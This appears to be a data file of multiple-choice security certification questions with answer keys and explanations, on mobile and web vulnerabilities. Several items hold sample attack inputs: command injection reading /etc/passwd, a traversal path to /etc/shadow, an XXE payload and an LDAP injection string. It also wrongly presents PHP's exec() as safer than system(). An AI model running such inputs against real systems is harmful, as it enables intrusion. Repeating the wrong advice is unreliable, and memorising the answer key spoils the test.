An Android user enables "Unknown Sources" and installs applications directly from APK files downloaded from third-party websites rather than Google Play Store. What mobile vulnerability is this?|Jailbreaking|Rooting|Sideloading|End-of-life|2|Sideloading is generally associated with Android devices utilizing Android Application Package (APK) files. While applications can also be sideloaded on Apple devices, the practice directly violates Apple's terms and conditions and voids the device's warranty. Voiding a device's warranty eliminates official support from the manufacturer, meaning the device may no longer receive security patches, bug fixes, or updates, leaving it vulnerable to new threats and exploits. Sideloading risks include: malware distribution (malicious apps masquerading as legitimate software), no app vetting (bypassing Google Play Protect scanning), trojanized apps (modified versions of legitimate apps with added malware), data theft (apps requesting excessive permissions), and ransomware distribution. While sideloading has legitimate uses (enterprise app distribution, beta testing, regional availability), it significantly increases risk when downloading from untrusted sources. Defense requires: mobile device management (MDM) preventing sideloading, user education about app store security, and application whitelisting for corporate devices.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A user gains root access on their Android device to remove carrier bloatware and install custom ROMs. What mobile device vulnerability does this create?|Jailbreaking|Rooting|Sideloading|Firmware vulnerability|1|Rooting allows users to bypass manufacturer or operating system restrictions on Android devices, providing more control over a device. This is commonly known as unlocking a device. This freedom, however, exposes the device to significant security risks. Rooted devices are susceptible to: counterfeit apps (unregulated stores can host third-party counterfeit or modified versions of legitimate apps carrying hidden malware), software instability (unauthorized software modifications can destabilize the operating system, leading to crashes and erratic behavior), and security compromises (rooting undermines device security measures, making it easier for malware and viruses to exploit vulnerabilities). Rooting provides superuser access, which: bypasses Android's permission system, disables security features like verified boot, prevents banking and payment apps from running (they detect root), and voids manufacturer warranty. While rooting has legitimate uses (custom ROMs, advanced features, removing bloatware), it fundamentally compromises the security model. Corporate policies typically prohibit rooted devices from accessing company resources.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A penetration tester discovers that a web application's file upload feature allows uploading PHP files, which are then executed by the server. What vulnerability class does this represent?|SQL injection|File upload vulnerability|Cross-site scripting|Buffer overflow|1|File upload vulnerabilities occur when web applications allow users to upload files without proper validation, sanitization, or restrictions. Attackers can exploit this to: upload and execute malicious code (PHP, JSP, ASP files), upload web shells for remote access, upload malware to distribute to other users, bypass authentication by uploading configuration files, and perform path traversal attacks by manipulating filenames. The example describes remote code execution through PHP upload, where the attacker uploads a PHP script that the web server executes, providing complete server control. Variations include: unrestricted file types (no extension validation), inadequate MIME type checking (only checking Content-Type header), filename manipulation (../../../etc/passwd), double extensions (malicious.php.jpg), and case sensitivity bypasses (file.PhP). Defense requires: validating file extensions against an allow list, verifying file content matches extension (magic bytes), storing uploaded files outside web root with no-execute permissions, renaming uploaded files to prevent direct execution, implementing file size limits, and scanning uploads with antimalware.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An application uses the system() function to process user input: system("ping " + user_input). An attacker enters: 8.8.8.8; cat /etc/passwd. What vulnerability is this?|SQL injection|Command injection|LDAP injection|XML injection|1|Command injection (also called OS command injection) occurs when an application passes unsafe user-supplied data to a system shell. Attackers can execute arbitrary operating system commands on the server, potentially leading to complete system compromise. The attack works by: injecting shell metacharacters (semicolon, pipe, ampersand, double-ampersand, double-pipe) that chain commands, using command substitution ($(...) or `...`), redirecting output (> <), or piping data between commands. In the example, the semicolon terminates the ping command and executes cat /etc/passwd, exposing user accounts. Successful command injection allows: reading sensitive files, modifying system configuration, installing backdoors, pivoting to other systems, data exfiltration, and denial of service. Prevention requires: avoiding system shell invocation when possible, using safe APIs that don't invoke shells, validating input against strict allow lists, escaping shell metacharacters, and running with least privileges. Languages provide safer alternatives: subprocess with shell=False (Python), exec() over system() (PHP), and parameterized execution methods.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A web application allows users to navigate to files using: /viewfile?name=../../../../etc/shadow. What vulnerability allows an attacker to access files outside the intended directory?|SQL injection|Cross-site scripting|Directory traversal|Command injection|2|Directory traversal (also called path traversal or dot-dot-slash) is a vulnerability that allows attackers to access files and directories outside the web application's root directory. By manipulating variables that reference files with "dot-dot-slash (../)" sequences, attackers can traverse the file system. The attack works by: using ../ sequences to navigate up directory levels, accessing sensitive files (/etc/passwd, /etc/shadow, web.config, database.yml), reading application source code, accessing log files with sensitive information, and reading configuration files with credentials. Variations include: encoded traversal (%2e%2e%2f), double encoding (%252e%252e%252f), Unicode encoding, absolute paths (/etc/passwd), and combining with null bytes (file.txt%00.jpg). Impact includes: exposure of sensitive information, credential theft, source code disclosure, and potential for further exploitation using discovered information. Prevention requires: validating user input against allow lists, using canonicalization to resolve symbolic links and relative paths, implementing chroot jails, and using language-specific safe file access APIs.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A web application processes user-supplied XML data without validation. An attacker submits: <?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><data>&xxe;</data>. What vulnerability is this?|SQL injection|XXE (XML External Entity) injection|Command injection|LDAP injection|1|XML External Entity (XXE) injection is a vulnerability that occurs when an application parses XML input containing a reference to an external entity. Attackers can exploit XXE to: read arbitrary files from the server, perform Server-Side Request Forgery (SSRF) attacks, execute denial-of-service attacks, and potentially achieve remote code execution. The attack leverages XML's ability to define external entities that reference external resources (files, URLs). When the XML parser processes the entity, it retrieves and includes the referenced content. In the example, &xxe; references file:///etc/passwd, causing the parser to read and return the file contents. XXE can also: access internal services (http://localhost:8080/admin), exfiltrate data to attacker-controlled servers, perform port scanning, and exploit backend systems. XXE is particularly dangerous in: SOAP web services, SAML authentication, SVG file processing, and RSS feeds. Prevention requires: disabling external entity processing in XML parsers, using simpler data formats (JSON), validating XML against schemas, and using less complex XML parsers.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An application with integer overflow vulnerability adds two large positive integers, resulting in a negative value that bypasses security checks. What type of vulnerability is this?|Buffer overflow|Integer overflow|Memory injection|Race condition|1|Integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside the range that can be represented with a given number of bits. When integers exceed their maximum value, they "wrap around" to their minimum value (or vice versa), producing unexpected results. Integer overflows are dangerous because: they can bypass security checks (negative values where positive expected), cause buffer overflows (size calculations wrap to small values), lead to memory corruption, and enable privilege escalation. Common scenarios include: adding two large numbers causing overflow, multiplying values for size calculations, subtracting resulting in underflow, and type conversions losing data. Real-world example: The Boeing 787 Dreamliner required rebooting every 248 days to prevent integer overflow in its electrical generation system. Prevention requires: using larger integer types when possible, validating input ranges before arithmetic, checking for overflow after operations, using languages with overflow detection, and using safe arithmetic libraries. Modern compilers can detect some integer overflow conditions, but explicit checking is still necessary for security-critical code.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An application allocates memory dynamically but fails to release it after use, causing the program to consume increasing amounts of memory until system resources are exhausted. What vulnerability is this?|Buffer overflow|Memory leak|Integer overflow|Memory injection|1|Memory leak vulnerabilities occur when an application allocates memory for use but fails to release it when no longer needed. Over time, the accumulated leaked memory can exhaust system resources, leading to: performance degradation (application slows as memory fills), system crashes (out-of-memory conditions), denial of service (forcing system reboots), and potential security exploitation (attackers triggering leaks deliberately). Memory leaks occur due to: lost pointers (references to allocated memory are overwritten), circular references (objects referencing each other preventing garbage collection), improper resource cleanup (failing to close file handles, database connections), exception handling without cleanup, and manual memory management errors in C/C++. While garbage-collected languages (Java, C#, Python) mitigate some risks, leaks can still occur through: JNI native code, caching without eviction, event listeners not removed, and large object retention. Detection requires: memory profiling tools, monitoring memory usage over time, and analyzing heap dumps. Prevention requires: using RAII (Resource Acquisition Is Initialization) in C++, try-finally or using blocks for cleanup, weak references for caches, and automated leak detection in CI/CD.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

An LDAP query is constructed using unsanitized user input: (&(uid=user_input)(password=pass)). An attacker enters: *)(uid=*))(OR(uid=*. What injection vulnerability is this?|SQL injection|XML injection|LDAP injection|Command injection|2|LDAP (Lightweight Directory Access Protocol) injection is a vulnerability that occurs when an application constructs LDAP statements using unsanitized user input. Attackers can modify LDAP queries to: bypass authentication, access unauthorized information, enumerate directory contents, and modify directory entries. LDAP injection exploits special characters in LDAP query syntax: * (wildcard), ( ) (grouping), ampersand and pipe (logical operators), and \ (escape). In the example, the attacker's input breaks the query structure and injects logic to always return true, bypassing authentication. LDAP injection attacks can: bypass login by injecting always-true conditions, enumerate users by injecting wildcards, access sensitive attributes, and perform privilege escalation. LDAP is commonly used in: Active Directory authentication, enterprise address books, organizational hierarchies, and access control systems. Prevention requires: input validation against allow lists, escaping LDAP special characters, using parameterized queries if available, implementing least privilege for LDAP accounts, and monitoring for LDAP injection patterns. Unlike SQL injection which is widely known, LDAP injection is often overlooked despite similar risks.|Threats, Vulnerabilities, and Mitigations|Vulnerabilities

A zero-day vulnerability in widely-used software is being actively exploited before the vendor releases a patch. What makes this vulnerability particularly dangerous?|It targets end-of-life systems|No patch or mitigation is available yet|It exploits default credentials|It requires physical access|1|Zero-day vulnerabilities are those unknown to the vendor with no available patch. They represent an especially dangerous threat vector because: no patch or update is available to fix the vulnerability, attackers have a window of opportunity before defenses can be implemented, traditional signature-based security tools cannot detect exploitation of unknown vulnerabilities, and the organization must rely on compensating controls while a patch is developed. Zero-days are valuable: nation-state actors stockpile them for espionage/warfare, criminal groups sell them for high prices ($1M+ for iOS zero-days), and advanced persistent threats (APTs) use them for targeted attacks. Organizations facing zero-day threats must: implement defense-in-depth strategies so no single vulnerability compromises the entire system, use behavioral analysis and anomaly detection to identify exploitation attempts, deploy virtual patching through WAFs or IPSs, isolate affected systems if possible, work with vendors to develop emergency patches, and monitor threat intelligence for indicators of compromise. Recent examples: Log4Shell (CVE-2021-44228), ProxyLogon Exchange vulnerabilities, and Eternal Blue (used by WannaCry).|Threats, Vulnerabilities, and Mitigations|Vulnerabilities
